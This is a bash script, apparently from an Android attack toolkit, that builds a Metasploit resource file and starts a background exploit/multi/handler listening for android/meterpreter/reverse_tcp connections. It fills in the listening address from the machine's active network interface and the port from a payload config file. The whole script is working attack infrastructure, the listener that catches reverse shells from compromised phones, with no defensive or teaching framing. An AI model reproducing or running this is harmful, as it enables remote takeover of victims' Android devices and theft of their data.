#!/bin/bash

sudo bash -c "touch meterpreter.rc"
sudo bash -c "echo use exploit/multi/handler >> meterpreter.rc"
sudo bash -c "echo set PAYLOAD android/meterpreter/reverse_tcp >> meterpreter.rc"

listen_host=$(ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1  -d'/')
listen_port=$(cat config_payload.ini | grep Listen_Port | sed -E 's/(.*)={1}(.*)/\2/')

sudo bash -c "echo set LHOST $listen_host >> meterpreter.rc"
sudo bash -c "echo set LPORT $listen_port >> meterpreter.rc"
sudo bash -c "echo exploit -j -z >> meterpreter.rc"
sudo bash -c "cat meterpreter.rc"
sudo bash -c "msfconsole -r meterpreter.rc"
